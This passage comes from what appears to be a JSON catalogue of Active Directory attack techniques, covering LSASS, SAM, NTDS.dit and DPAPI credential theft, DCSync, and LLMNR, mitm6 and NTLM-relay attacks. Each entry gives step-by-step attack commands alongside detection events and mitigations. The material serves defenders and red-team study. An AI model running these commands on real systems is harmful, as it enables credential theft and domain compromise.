Local","mitre":"T1003.001","cve":"","sev":"Critical","summary":"Abuse the MiniDump export of the OS-standard DLL (comsvcs.dll) to dump LSASS process memory to disk and steal plaintext / NTLM hashes / Kerberos tickets.","how":"Prerequisite: local administrator with SeDebugPrivilege on the target host. Steps: obtain the LSASS PID and run rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\temp\\lsass.dmp full. Exfiltrate the generated .dmp offline and analyze on the attacker side with mimikatz (sekurlsa::minidump then sekurlsa::logonPasswords) or pypykatz. Easy to evade AV since no additional signed binary is required.","tools":"rundll32.exe+comsvcs.dll, mimikatz sekurlsa::minidump, pypykatz, tasklist/Get-Process","detect":"Monitor Sysmon EventID 10 (ProcessAccess) for accesses to lsass.exe with GrantedAccess 0x1010/0x1410/0x143a etc. Detect command lines where rundll32.exe runs comsvcs.dll MiniDump as arguments (4688/Sysmon 1). Correlate the process that opened the LSASS handle via EDR.","events":"Sysmon 10, Sysmon 1, 4688, Sysmon 11(dmp生成)","mitigate":"Enable Credential Guard (VBS) to isolate credentials inside LSASS. Enable LSASS RunAsPPL (RunAsPPL=1) for Protected Process Light. Enable the Attack Surface Reduction (ASR) rule 'Block credential stealing from LSASS'. Minimize administrator privileges and enforce tier separation."},{"name":"LSASS Dump via ProcDump / Task Manager / Direct Syscalls","aka":"Sysinternals ProcDump LSASS / nanodump / dumpert","phase":"credaccess","group":"Host / Local","mitre":"T1003.001","cve":"","sev":"Critical","summary":"A family of variants that obtain a full memory dump of LSASS using signed Sysinternals procdump or various dumpers. Many implementations use direct syscalls or handle duplication to evade EDR.","how":"Prerequisite: local administrator + SeDebugPrivilege. Dump with a signed binary via procdump.exe -accepteula -ma lsass.exe lsass.dmp. In the GUI, right-click in Task Manager and 'Create dump file'. EDR-evasion variants: nanodump (direct syscall + signature invalidation), dumpert (direct NtReadVirtualMemory call), MirrorDump, HandleKatz (duplicating existing handles), SilentProcessExit (via WerFault). Analyze offline with pypykatz.","tools":"procdump.exe, nanodump, dumpert, HandleKatz, MirrorDump, SilentProcessExit手法, WerFault.exe","detect":"Monitor high-privilege handle acquisition to lsass.exe via Sysmon 10 (procdump/unsigned/anomalous caller). Detect procdump command-line arguments (-ma lsass). For SilentProcessExit, monitor changes to the SilentProcessExit registry key (HKLM\\...\\Image File Execution Options).","events":"Sysmon 10, Sysmon 1/4688, Sysmon 13(レジストリ改変), Sysmon 11","mitigate":"RunAsPPL + Credential Guard. Apply ASR rules. Application control (WDAC/AppLocker) for Sysinternals tools such as procdump. EDR LSASS access protection (tamper protection). Operate with Restricted Admin / Remote Credential Guard."},{"name":"LSASS Dump via mimikatz sekurlsa (live)","aka":"sekurlsa::logonpasswords / pth-material extraction","phase":"credaccess","group":"Host / Local","mitre":"T1003.001","cve":"","sev":"Critical","summary":"Run mimikatz directly on the host to live-extract cleartext passwords, NTLM hashes, Kerberos tickets, and DPAPI master keys from LSASS memory.","how":"Prereq: local admin. Launch mimikatz -> privilege::debug -> sekurlsa::logonpasswords (credentials for all logon sessions), sekurlsa::ekeys (Kerberos AES keys), sekurlsa::tickets (TGT/TGS), sekurlsa::dpapi (master keys). Cleartext is recoverable where WDigest is enabled (legacy OS / UseLogonCredential=1). Fileless variants that run in memory only (Invoke-Mimikatz, Cobalt Strike mimikatz) are also common.","tools":"mimikatz, Invoke-Mimikatz(PowerShell), Cobalt Strike, pypykatz(live)","detect":"Detect mimikatz-specific strings/API calls via AV/EDR. Sysmon 10 lsass access. PowerShell ScriptBlock logging (4104) for Invoke-Mimikatz traces. Anomalous SeDebugPrivilege enablement from an unexpected process.","events":"Sysmon 10, 4104, 4688, 4673(特権呼び出し)","mitigate":"Enforce WDigest disablement (UseLogonCredential=0) and pin it via GPO. Credential Guard / RunAsPPL. ASR rules. Minimize logon sessions; Tier operations that leave no admin credentials resident after interactive logon."},{"name":"SAM Hive Dump (local account hashes)","aka":"reg save SAM / secretsdump local / lsadump::sam","phase":"credaccess","group":"Host / Local","mitre":"T1003.002","cve":"","sev":"High","summary":"Obtain the SAM registry hive and SYSTEM (bootkey) to extract NTLM hashes of local accounts. Used for lateral movement of local admins (PtH) and password cracking.","how":"Prereq: local admin. Dump the hives with reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save, then decrypt offline with impacket secretsdump.py -sam sam.save -system system.save LOCAL. Live: mimikatz lsadump::sam. Remote: secretsdump.py DOMAIN/user@host. VSS copies or esentutl can bypass file locks.","tools":"reg.exe save, impacket-secretsdump, mimikatz lsadump::sam, NetExec --sam","detect":"Command lines targeting SAM/SECURITY/SYSTEM with reg.exe save (4688/Sysmon1). Handle access to the SAM/SECURITY hives (4656/4663, when SACL is set). Service creation (7045) or admin$ access from remote secretsdump.","events":"4688/Sysmon 1, 4656/4663, 4657, 7045(リモート時)","mitigate":"Use LAPS to make local admin passwords unique and neutralize PtH lateral movement. Disable/rename the local admin account. Credential Guard does not cover this, so enable SACL auditing on sensitive hives. Block reg save + SAM arguments via EDR."},{"name":"LSA Secrets Dump","aka":"lsadump::secrets / SECURITY hive secrets","phase":"credaccess","group":"Host / Local","mitre":"T1003.004","cve":"","sev":"High","summary":"Decrypt and steal LSA Secrets (service account cleartext passwords, machine account, DPAPI_SYSTEM, autologon credentials, cache).","how":"Prereq: local admin (SYSTEM-equivalent). impacket secretsdump.py decrypts and outputs LSA secrets from the SECURITY+SYSTEM hives. Live: mimikatz lsadump::secrets. This yields service account cleartext passwords, DefaultPassword (autologon), $MACHINE.ACC, _SC_<service>, etc., leading directly to domain service account takeover and lateral movement.","tools":"impacket-secretsdump, mimikatz lsadump::secrets, NetExec --lsa, reg save","detect":"Access to the SECURITY hive (4656/4663 SACL), reg save SECURITY command lines. Service creation 7045 / RemoteRegistry access on remote execution. Correlate anomalous authentication following exposure of service account cleartext.","events":"4688/Sysmon 1, 4656/4663, 7045","mitigate":"Migrate services to gMSA/MSA to eliminate cleartext password storage. Retire autologon (DefaultPassword). Strong service account passwords + rotation. Suppress privilege escalation and use EDR."},{"name":"Cached Domain Credentials Dump (MSCACHEv2/DCC2)","aka":"mscash2 / cachedump / lsadump::cache","phase":"credaccess","group":"Host / Local","mitre":"T1003.005","cve":"","sev":"High","summary":"Extract domain credentials cached locally for offline logon when a DC is unreachable (MSCACHEv2 hashes) and crack them offline.","how":"Prereq: local admin. impacket secretsdump.py outputs $DCC2$-format cache from the SECURITY+SYSTEM hives, or mimikatz lsadump::cache. MSCACHEv2 cannot be used for PtH, but offline dictionary/brute-force is possible with hashcat -m 2100. Targets cleartext recovery of recently logged-on domain users (especially privileged ones). Last 10 entries cached by default.","tools":"impacket-secretsdump, mimikatz lsadump::cache, cachedump, hashcat -m 2100","detect":"SECURITY hive access (4656/4663). reg save/secretsdump traces. MSCACHEv2 itself generates no network traffic, so focus on correlating hive exfiltration with offline behavior.","events":"4688/Sysmon 1, 4656/4663","mitigate":"Reduce cache count via GPO (CachedLogonsCount=0-1, trades off availability). Do not let privileged accounts interactively log on to general endpoints (prevents cache creation). Strong passphrases improve offline-crack resistance."},{"name":"NTDS.dit Theft via Volume Shadow Copy (VSS)","aka":"vssadmin NTDS.dit / esentutl / diskshadow","phase":"credaccess","group":"Host / Local","mitre":"T1003.003","cve":"","sev":"Critical","summary":"Create a VSS snapshot on a domain controller to copy the locked NTDS.dit and SYSTEM hive, extracting hashes for all domain accounts (including krbtgt).","how":"Prereq: Domain Admin / DC admin on the DC. vssadmin create shadow /for=C: to create a shadow, then copy \\\\?\\GLOBALROOT\\...\\Windows\\NTDS\\NTDS.dit and SYSTEM. Alternatives: diskshadow scripts, esentutl /y /vss, wbadmin, ntdsutil ifm. Extract all hashes offline with secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL or DSInternals. Obtaining the krbtgt hash leads to Golden Ticket.","tools":"vssadmin, diskshadow, esentutl, wbadmin, ntdsutil(ifm), impacket-secretsdump, DSInternals","detect":"Execution of vssadmin create shadow / diskshadow / ntdsutil / esentutl on a DC (4688/Sysmon1). VSS creation events. File access to NTDS.dit / GLOBALROOT paths. Shadow copy operations on a DC are highly suspicious if outside legitimate operations.","events":"4688/Sysmon 1, 8222(VSS), 4656/4663(NTDSアクセス), Sysmon 11","mitigate":"Strictly limit DC logon rights (Tier0). Monitor and alert on vssadmin/ntdsutil execution on DCs. Credential Guard does not cover this, but harden admin takeover itself via DC isolation, PAW, and LAPS/MFA. Perform periodic krbtgt double-reset."},{"name":"NTDS.dit Extraction via ntdsutil IFM","aka":"Install From Media / create ifm","phase":"credaccess","group":"Host / Local","mitre":"T1003.003","cve":"","sev":"Critical","summary":"Abuse ntdsutil's 'Install From Media (IFM)' feature -- meant to promote an additional DC (writable DC or RODC) without initial replication over the network -- to export NTDS.dit and the registry together and steal hashes. Uses create full (for writable DCs), which retains secrets, not create rodc (for RODCs, which strips secrets).","how":"Prereq: admin rights on the DC. powershell -c \"ntdsutil 'ac i ntds' 'ifm' 'create full C:\\temp\\ifm' q q\" generates NTDS.dit, SYSTEM, and SECURITY in one pass. Being a legitimate admin tool, AV detection is weak. Exfiltrate the output offline and extract all domain hashes with secretsdump.py -ntds ... -system ... LOCAL.","tools":"ntdsutil.exe, impacket-secretsdump, DSInternals","detect":"ntdsutil.exe execution on a DC with command lines containing 'ifm' / 'create full' (4688/Sysmon1). Creation of a large NTDS.dit directly under C:\\ etc. (Sysmon11). Treat execution outside legitimate DC promotion as highly suspicious and alert immediately.","events":"4688/Sysmon 1, Sysmon 11","mitigate":"Limit interactive operations on DCs to least privilege via PAW. Whitelist and monitor ntdsutil execution. Tier0 isolation; prohibit IFM generation outside change management."},{"name":"DCSync (directory replication credential theft)","aka":"lsadump::dcsync / secretsdump remote","phase":"credaccess","group":"Host / Local","mitre":"T1003.006","cve":"","sev":"Critical","summary":"Without physically touching a DC, abuse the directory replication protocol (DRSUAPI/GetNCChanges) to remotely replicate the hashes of any user (including krbtgt).","how":"Prereq: Replicating Directory Changes / All / In Filtered Set rights (default DA/DC/Enterprise Admin; a regular user may hold them due to delegation mistakes). mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt or impacket secretsdump.py -just-dc corp/user@dc. Achieves the equivalent of NTDS.dit theft remotely, leading to Golden Ticket.","tools":"mimikatz lsadump::dcsync, impacket-secretsdump -just-dc, NetExec","detect":"Directory replication event 4662 (GUID: DS-Replication-Get-Changes 1131f6aa/1131f6ad/89e95b76) on a DC originating from a 'non-DC host / regular user'. DRSUAPI (RPC) from a non-DC source IP. Inventory replication-rights holders with BloodHound.","events":"4662, 4624(ログオン相関), ネットワークDRSUAPI","mitigate":"Minimize and inventory holders of replication rights (GetChanges/GetChangesAll). Review delegations. Whitelist replication source IPs from DCs (IPsec/firewall). Alert on 4662 replication GUIDs in the SIEM."},{"name":"GPP cpassword (Group Policy Preferences)","aka":"Groups.xml AES cpassword / Get-GPPPassword","phase":"credaccess","group":"Host / Local","mitre":"T1552.006","cve":"CVE-2014-1812","sev":"High","summary":"Decrypt the cpassword attribute in GPP XML (Groups.xml, etc.) on SYSVOL using the published fixed AES key to obtain local/service account cleartext passwords.","how":"Prereq: any authenticated domain user (SYSVOL is readable by all users). Collect cpassword values from Groups.xml/Services.xml/ScheduledTasks.xml/Drives.xml/DataSources.xml/Printers.xml under \\\\domain\\SYSVOL and decrypt with Microsoft's published fixed AES-256 key. Get-GPPPassword (PowerSploit), gpp-decrypt, impacket Get-GPPPassword.py. If the recovered cleartext is a shared local admin, it leads directly to lateral movement.","tools":"Get-GPPPassword(PowerSploit), gpp-decrypt(Kali), impacket Get-GPPPassword.py, findstr /S cpassword","detect":"Search for cpassword strings in SYSVOL XML. Bulk file access to SYSVOL. Get-GPPPassword execution in the domain (4104). Inventory existing GPP XML.","events":"4104, 5145(共有オブジェクトアクセス, SACL時)","mitigate":"Apply MS14-025 to prevent creation of new GPP passwords. Audit for residual cpassword across SYSVOL with findstr etc. and delete the affected GPP/XML. Immediately rotate exposed credentials. Migrate to LAPS."},{"name":"LAPS Password Read (ms-Mcs-AdmPwd)","aka":"LAPS abuse / Get-LAPSPassword / Windows LAPS","phase":"credaccess","group":"Host / Local","mitre":"T1552","cve":"","sev":"High","summary":"Abuse over-granted read rights to retrieve the cleartext LAPS attribute (ms-Mcs-AdmPwd / msLAPS-Password) from LDAP.","how":"Prereq: a user with ReadProperty (ControlAccess) rights on the target computer object's ms-Mcs-AdmPwd attribute (tends to sprawl via delegation mistakes). Search LDAP for (ms-Mcs-AdmPwdExpirationTime=*) and read ms-Mcs-AdmPwd. Tools: pyLAPS, LAPSDumper, Get-LAPSPasswords, NetExec -M laps, identify the ReadLAPSPassword edge in BloodHound. Windows LAPS supports encryption (DPAPI-NG), but cleartext-storage environments still exist.","tools":"pyLAPS, LAPSDumper, Get-LAPSPasswords(PowerShell), NetExec -M laps, BloodHound","detect":"Reads of the ms-Mcs-AdmPwd attribute (4662, SACL auditing with property GUID specified). LDAP searches of LAPS attributes by unexpected principals. Detect anomalous growth of ReadLAPSPassword holders in BloodHound.","events":"4662(属性アクセス, SACL要), 4624","mitigate":"Inventory ms-Mcs-AdmPwd/msLAPS read ACLs at least privilege (remove delegations). Enable Windows LAPS encryption (DPAPI-NG). Set read-access audit SACLs on all computer OUs. Periodic rotation."},{"name":"gMSA Password Retrieval (msDS-ManagedPassword)","aka":"GMSAPasswordReader / gMSADumper / read GMSA blob","phase":"credaccess","group":"Host / Local","mitre":"T1003, T1552","cve":"","sev":"High","summary":"Retrieve a group Managed Service Account (gMSA) msDS-ManagedPassword blob using a principal listed in PrincipalsAllowedToRetrieveManagedPassword and compute the NTLM hash.","how":"Prereq: rights of an account included in the target gMSA's msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword). Read msDS-ManagedPassword via LDAP and parse the MSDS-MANAGEDPASSWORD_BLOB to compute the NTLM hash / AES keys. gMSADumper.py, GMSAPasswordReader.exe, DSInternals (Get-ADReplAccount, etc.). Note: Get-ADServiceAccount is an RSAT AD module cmdlet. Use the recovered hash for Overpass-the-Hash / service impersonation. Identify delegated targets via BloodHound's ReadGMSAPassword edge.","tools":"gMSADumper.py, GMSAPasswordReader, DSInternals, NetExec --gmsa, BloodHound","detect":"LDAP reads of the msDS-ManagedPassword attribute (4662). Retrieval by unexpected principals. Correlate gMSA blob requests over LDAPS on the network side. Audit ReadGMSAPassword holders in BloodHound.","events":"4662(属性アクセス), 4624","mitigate":"Limit PrincipalsAllowedToRetrieveManagedPassword to a minimal set of hosts/services and inventory periodically. Protect the hosts granted the gMSA themselves (Tier separation). Set audit SACLs for anomalous retrieval."},{"name":"DPAPI Master Key & Credential Blob Theft","aka":"dpapi::masterkey / SharpDPAPI / mimikatz dpapi","phase":"credaccess","group":"Host / Local","mitre":"T1555, T1003.001","cve":"","sev":"High","summary":"Decrypt the master key to plaintext DPAPI-protected user credentials (Credential Manager blobs, RDP, scheduled tasks, etc.).","how":"Prereq: target user session or local admin/DA. User side: decrypt the master key in %APPDATA%\\Microsoft\\Protect\\<SID>\\ with the user password/hash (mimikatz dpapi::masterkey /sid /password or /rpc). Admin side: extract DPAPI master keys from LSASS (sekurlsa::dpapi). Domain-wide: obtaining the DPAPI backup key (domain backup key) on a DC via lsadump::backupkeys allows decrypting every user's master key. Decryption targets are the Credential files in %APPDATA%\\Microsoft\\Credentials\\. Automate with SharpDPAPI.","tools":"mimikatz dpapi::*/sekurlsa::dpapi/lsadump::backupkeys, SharpDPAPI, DonPAPI, impacket dpapi.py","detect":"Access to %APPDATA%\\Microsoft\\Protect and \\Credentials (Sysmon11/4663). Correlate DPAPI backup key retrieval on a DC as anomalous operations via DRSUAPI/LSA. SharpDPAPI/mimikatz execution traces.","events":"4663/Sysmon 11, Sysmon 10(LSASS), 4104","mitigate":"Partial protection via Credential Guard. Strictly protect the DPAPI domain backup key on DCs at Tier0 (theft = decryption for all users). Operationally avoid storing sensitive credentials in Credential Manager. Suppress host compromise and admin takeover themselves."},{"name":"DPAPI Browser Credential/Cookie Theft","aka":"Chrome/Edge Login Data / cookies / SharpChrome","phase":"credaccess","group":"Host / Local","mitre":"T1555.003","cve":"","sev":"High","summary":"Decrypt the DPAPI-encrypted AES state key (Local State) of Chromium-based browsers to plaintext saved passwords/cookies and hijack sessions.","how":"Prereq: target user context or local admin. Decrypt the encrypted_key in %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State with DPAPI to obtain the AES-GCM key, then decrypt the v10/v11 blobs in Login Data/Cookies (SQLite). SharpChrome, DonPAPI, LaZagne, HackBrowserData. In environments with Chrome App-Bound Encryption (v20), an additional decryption method via IElevator COM is required. Cookie theft enables MFA bypass (session hijacking).","tools":"SharpChrome, LaZagne, HackBrowserData, DonPAPI, mimikatz dpapi::chrome","detect":"Access to browser profiles (Login Data/Cookies/Local State) from non-browser processes (Sysmon11/4663). Execution of LaZagne, etc. Session reuse from anomalous geo/device (IdP side).","events":"4663/Sysmon 11, 4688, IdP認証ログ","mitigate":"Enable the browser's App-Bound Encryption. Monitor access to sensitive browser files via endpoint EDR. On the IdP side, invalidate cookie reuse with continuous access evaluation / short-lived sessions / device binding. Prohibit browser credential storage for privileged users."},{"name":"WDigest Plaintext Credential Harvesting","aka":"UseLogonCredential=1 downgrade","phase":"credaccess","group":"Host / Local","mitre":"T1003.001, T1112","cve":"","sev":"High","summary":"Re-enable WDigest (UseLogonCredential=1) to make LSASS cache cleartext passwords, then harvest cleartext on subsequent logons.","how":"Prereq: local admin. Set reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1. After the user re-logs on, obtain cleartext with mimikatz sekurlsa::wdigest. A persistence-plus-credential-theft technique that deliberately downgrades a feature disabled by default (Win8.1/2012R2 and later).","tools":"reg.exe, mimikatz sekurlsa::wdigest","detect":"Change of the UseLogonCredential registry value to 1 (Sysmon13/4657). Alert on WDigest-related key modifications as highly suspicious.","events":"Sysmon 13, 4657, 4688","mitigate":"Force-deploy UseLogonCredential=0 via GPO/registry and monitor for tampering. Prevent cleartext caching itself with Credential Guard. Block registry modification via EDR."},{"name":"PPL Bypass to Dump Protected LSASS","aka":"PPLdump / PPLKiller / mimidrv / BYOVD","phase":"credaccess","group":"Host / Local","mitre":"T1003.001, T1068","cve":"","sev":"High","summary":"Neutralize an LSASS process protected by RunAsPPL (Protected Process Light) via a vulnerable driver or known bypass, then dump its memory.","how":"Prereq: local admin. When a normal dump fails under PPL protection, dump lsass with PPLdump (a known PPL bypass), or strip the PPL attribute with mimikatz !+ / !processprotect (mimidrv driver), or use BYOVD (load a vulnerable signed driver and access LSASS from the kernel). Then perform a normal dump + pypykatz parsing. Primarily targets PPL-only environments without Credential Guard.","tools":"PPLdump, PPLKiller, mimidrv(mimikatz), BYOVD(各種脆弱ドライバ)","detect":"Vulnerable driver load (Sysmon 6, DriverLoad). Service creation of an unsigned/known-malicious driver (7045). PPL attribute changes or anomalous LSASS access via the kernel. Microsoft Vulnerable Driver Blocklist violations.","events":"Sysmon 6, 7045, Sysmon 10, 4688","mitigate":"Deploy Credential Guard (VBS) for stronger protection than PPL alone. Block vulnerable driver loads with Microsoft Vulnerable Driver Blocklist / WDAC. Enable HVCI (Memory Integrity). EDR driver monitoring."},{"name":"Kerberos Ticket / Key Extraction from LSASS","aka":"sekurlsa::tickets / ekeys / Rubeus dump","phase":"credaccess","group":"Host / Local","mitre":"T1558, T1003.001","cve":"","sev":"High","summary":"Extract Kerberos TGT/TGS tickets and AES keys of currently logged-on users from LSASS memory and use them for Pass-the-Ticket / impersonation.","how":"Prereq: local admin (SeTcbPrivilege/SeDebug). Export .kirbi tickets with mimikatz sekurlsa::tickets /export, and obtain AES256 keys with sekurlsa::ekeys. Rubeus dump / triage extracts the same. Reuse a captured TGT on another host via Pass-the-Ticket (Rubeus ptt / mimikatz kerberos::ptt) for lateral movement. If another user's (admin's) ticket remains in a local admin's session, it leads directly to privilege escalation.","tools":"mimikatz sekurlsa::tickets/ekeys, Rubeus dump/triage/ptt","detect":"Sysmon 10 LSASS access. Reuse of the same TGT from an anomalous host (geo/device mismatch in 4768/4769). Pass-the-Ticket-specific logons (4624 Type 3, ticket encryption-type inconsistencies).","events":"Sysmon 10, 4768, 4769, 4624","mitigate":"Isolate tickets/keys in VSM with Credential Guard. RunAsPPL. Shorten privileged ticket lifetime (TGT lifetime). Restrict admin interactive logons to PAWs to prevent ticket residue. SIEM detection of anomalous reuse."},{"name":"Credential Manager / Vault Dump","aka":"vault::cred / Windows Vault / cmdkey","phase":"credaccess","group":"Host / Local","mitre":"T1555.004","cve":"","sev":"Medium","summary":"Enumerate and decrypt generic/domain credentials and saved RDP credentials stored in Windows Credential Manager (Vault) to steal them.","how":"Prereq: target user context or admin. Enumerate saved credentials with cmdkey /list, decrypt the Vault with mimikatz vault::list / vault::cred, or auto-extract with SharpDPAPI or LaZagne. Targets web credentials and saved RDP passwords. Saved RDP (.rdp + DPAPI blob) can also be decrypted under user operation.","tools":"cmdkey, mimikatz vault::cred, SharpDPAPI, LaZagne","detect":"Access to Vault-related files (%APPDATA%\\Microsoft\\Vault, \\Credentials) (Sysmon 11/4663). cmdkey /list execution, mimikatz vault artifacts.","events":"4663/Sysmon 11, 4688","mitigate":"Operationally prevent storing privileged/shared credentials in the Vault. Disable RDP credential saving (GPO: Do not allow passwords to be saved). Credential Guard, EDR monitoring."},{"name":"Registry Autologon / Stored Plaintext Credentials","aka":"Winlogon DefaultPassword / unattend.xml / AutoLogon","phase":"credaccess","group":"Host / Local","mitre":"T1552.001, T1552.002","cve":"","sev":"Medium","summary":"Recover credentials left in plaintext in the registry's Winlogon autologon settings, in unattended-install files, or in scripts.","how":"Prereq: local admin or registry/file read access. Check DefaultPassword/DefaultUserName/AutoAdminLogon via reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' (stored in plaintext or in the aforementioned LSA secrets). Additionally, sweep C:\\Windows\\Panther\\unattend.xml, sysprep.inf, Autounattend.xml, various non-GPP scripts (.ps1/.bat), and IIS web.config connectionStrings.","tools":"reg query, findstr /si password *.xml *.ini *.txt, PowerUp, Seatbelt, LaZagne","detect":"Access to the Winlogon key (DefaultPassword). Access to residual Panther/sysprep files. Credential-hunting command lines such as findstr password (4688/Sysmon 1).","events":"4688/Sysmon 1, 4663, Sysmon 13","mitigate":"Discontinue autologon (AutoAdminLogon). Remove unattend/sysprep leftovers after deployment (build cleanup). Prohibit embedding plaintext credentials in scripts/config files; use a credential vault. Regular filesystem credential scans."},{"name":"LLMNR / NBT-NS Poisoning","aka":"Responder, multicast name-resolution poisoning","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"","sev":"High","summary":"A man-in-the-middle attack that sends spoofed responses to LLMNR/NBT-NS broadcasts sent on name-resolution failure, capturing the victim's NTLMv1/v2 authentication (Net-NTLM hashes).","how":"Sit in the same broadcast domain and answer LLMNR (UDP 5355) / NBT-NS (UDP 137) queries with your own IP using Responder or similar. When a victim accesses a typo or nonexistent share (\\\\srv01), SMB/HTTP authentication is triggered, yielding a Net-NTLMv2 hash. Crack captured hashes offline with hashcat, or relay them to hosts with SMB signing disabled. Prereqs are L2 reachability and LLMNR/NBT-NS being enabled.","tools":"Responder (-I eth0 -wv), Inveigh (PowerShell/C#), hashcat -m 5600, ntlmrelayx","detect":"A honey-client that injects LLMNR/NBT-NS spoof detection from your own host (periodically resolving a nonexistent hostname and monitoring whether a response comes back) is effective. Monitor authentication attempts to unexpected hosts over SMB/HTTP, and hosts receiving many Net-NTLM authentications in a short window.","events":"Sysmon 22 (DNSQuery異常), Security 4624/4625 (NTLM logon), ネットワークセンサでのLLMNR/NBT-NS応答検知","mitigate":"Disable LLMNR via GPO (HKLM\\...\\DNSClient EnableMulticast=0), disable NetBIOS over TCP/IP (DHCP option or NIC setting). Eliminate fallback with correct internal DNS operation. Require SMB signing to kill relay targets."},{"name":"mDNS Poisoning","aka":"Multicast DNS spoofing, Responder -m","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"","sev":"Medium","summary":"A variant that spoofs responses to mDNS (.local) name resolution used by Apple Bonjour and others, capturing authentication like LLMNR.","how":"Intercept and spoof mDNS queries to 224.0.0.251:5353 with Responder, hijacking .local hostname resolution. Especially effective in mixed environments (Mac/IoT/printers). An easily overlooked path that often persists even where LLMNR/NBT-NS have been disabled. Crack or relay the captured Net-NTLM.","tools":"Responder (-m有効), Inveigh","detect":"Monitor mDNS (UDP 5353) response patterns within the segment, and mass mDNS responses from unexpected devices. .local name-resolution tests via a honey-client.","events":"ネットワークIDSのmDNSシグネチャ, 4624/4625","mitigate":"If unnecessary, block UDP 5353 at the firewall and stop the mDNS responder service. Isolate IoT/clients from AD authentication systems via segmentation."},{"name":"WPAD / PAC Poisoning","aka":"Web Proxy Auto-Discovery abuse","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2016-3213","sev":"High","summary":"Hijack the WPAD proxy name auto-discovered by browsers/OSes via name-resolution poisoning to intercept all HTTP traffic and force NTLM authentication.","how":"Spoof responses for the \"WPAD\" hostname via LLMNR/NBT-NS/DNS and distribute a malicious wpad.dat. Returning 407 Proxy Authentication Required to proxied HTTP requests causes the browser to automatically send NTLM authentication, enabling Net-NTLM capture with no user interaction. Combine with ntlmrelayx's WPAD/proxy feature.","tools":"Responder (WPAD/proxy-auth), ntlmrelayx (--wpad-host)","detect":"Divergence between WPAD-host name-resolution requests and the responding source, unexpected proxy settings, NTLM accompanied by Proxy-Authenticate 407.","events":"4624/4625, プロキシ/Webフィルタログ","mitigate":"Apply MS16-077 (disables WPAD NTLM auto-authentication and eliminates name resolution over HTTP). Register a legitimate wpad record in DNS (or disable WPAD via GPO), and disable browser automatic proxy detection."},{"name":"mitm6 - IPv6 DNS Takeover","aka":"DHCPv6 spoofing, rogue IPv6 DNS","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001, T1557","cve":"","sev":"Critical","summary":"Abuse Windows' default preference for IPv6 by setting yourself as the DNS server via malicious DHCPv6 responses, gaining full control of name resolution and chaining to NTLM relay.","how":"Answer DHCPv6 Solicit/Request with mitm6 and assign the victim a link-local IPv6 DNS (= the attacker). Hijack resolution of WPAD or any FQDN and relay to LDAP/LDAPS with ntlmrelayx. Powerful because machine-account authentications fire periodically even with no user interaction. A typical chain is mitm6 + ntlmrelayx -6 --delegate-access to establish RBCD. Prereq is IPv6 being enabled on clients (enabled by default).","tools":"mitm6 (-d domain.local), ntlmrelayx.py -6 -t ldaps://dc --delegate-access","detect":"Appearance of an illegitimate DHCPv6 server, a client's DNS server changing to a fe80:: link-local address, mass dynamic DNS update failures.","events":"DHCPサーバ/スイッチのDHCPv6ガードログ, 4624 (NTLM, マシンアカウント), 5136 (RBCD属性変更)","mitigate":"Rather than disabling IPv6 unnecessarily, enable RA Guard/DHCPv6 Guard on switches. Statically register the WPAD DNS entry. Neutralize relay targets by requiring LDAP signing + channel binding (EPA)."},{"name":"NTLM Relay to SMB","aka":"SMB relay, ntlmrelayx SMB","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2008-4037","sev":"High","summary":"The classic relay: forward captured NTLM authentication to another host's SMB to authenticate and run commands / dump the SAM / access files.","how":"Capture hashes with Responder (SMB/HTTP disabled) -> ntlmrelayx relays to a target with SMB signing disabled. If the relayed identity holds local admin, run commands with -c, dump SAM/LSA with --dump-sam, and reuse the session via socks. Prereqs: the target's SMB signing is 'disabled/not required' and the relayed account has privileges. Reflection back to the originating host has been impossible since MS08-068.","tools":"ntlmrelayx.py -tf targets.txt -smb2support -c/--dump-sam/-socks, Responder","detect":"Consecutive NTLM authentications from a single source to multiple hosts, immediate admin operations after a non-interactive logon (service creation 7045 / PsExec). Relays are characterized by a mismatch between source IP and authenticating principal.","events":"4624 (Logon Type 3, NTLM), 4672, 7045 (サービス作成), 5140/5145 (共有アクセス)","mitigate":"Require SMB signing on all hosts (both server/client GPO: RequireSecuritySignature=1). Cut off the entry point with name-resolution poisoning countermeasures. Minimize local admin share privileges, deploy LAPS."},{"name":"NTLM Relay to LDAP / LDAPS","aka":"ntlmrelayx LDAP, RBCD/Shadow Credentials/rights granting","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001, T1187","cve":"CVE-2017-8563","sev":"Critical","summary":"Relay machine/user authentication to a DC's LDAP, leading directly to domain privilege escalation such as RBCD configuration, Shadow Credentials grants, computer creation, and DCSync rights grants.","how":"Coerce a DC's machine-account authentication via forced authentication (PetitPotam, etc.) -> relay to ldap(s)://DC with ntlmrelayx. With --delegate-access, set RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) on an attacker-controlled computer and reach the DC via S4U2self. Alternatively, write msDS-KeyCredentialLink (Shadow Credentials) for PKINIT. For unsigned LDAP, combine with MIC removal such as drop-the-MIC. Prereq: LDAP signing/channel binding not enforced.","tools":"ntlmrelayx.py -t ldap://dc --delegate-access / --add-computer / --escalate-user, PetitPotam.py, gettgtpkinit/Rubeus","detect":"Addition of msDS-AllowedToActOnBehalfOfOtherIdentity or msDS-KeyCredentialLink (5136), new computer account creation (4741), ACL changes (5136 nTSecurityDescriptor). DC machine authentication originating from another host.","events":"4624(NTLM), 4741(コンピュータ作成), 5136(RBCD/KeyCredential/ACL), 4662(DCSync)","mitigate":"Require LDAP signing on the DC (LDAPServerIntegrity=2) + require LDAPS channel binding (EPA). ms-DS-MachineAccountQuota=0. Audit and privilege-protect RBCD/KeyCredential attributes. Apply the CVE-2017-8563 patch."},{"name":"PrivExchange (EWS Coercion → LDAP 